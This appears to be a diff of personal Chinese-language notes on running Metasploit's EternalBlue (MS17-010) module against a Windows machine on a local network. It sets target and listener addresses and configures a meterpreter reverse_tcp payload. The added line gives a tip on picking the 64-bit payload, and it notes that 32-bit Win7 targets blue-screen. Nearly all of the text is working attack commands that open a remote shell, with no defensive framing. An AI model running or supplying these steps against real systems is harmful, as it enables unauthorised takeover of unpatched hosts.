@@ -9,7 +9,7 @@ run
 use exploit/windows/smb/ms17_010_eternalblue
  set RHOST 192.168.1.227
  set LHOST 192.168.5.118    本机
-//set payload windows/x64/meterpreter/reverse_tcp     //配置回链方式   跳过这句成功后  再运行它再次exploit 这句就执行了
+//set payload windows/x64/meterpreter/reverse_tcp     //配置回链方式   跳过这句成功后  再运行它再次exploit 这句就执行了  如果目标是64位千万别这么写 payload windows/meterpreter/reverse_tcp   弹框错误
 run 或者 exploit
 
 win7 32位失败  老是 蓝屏   
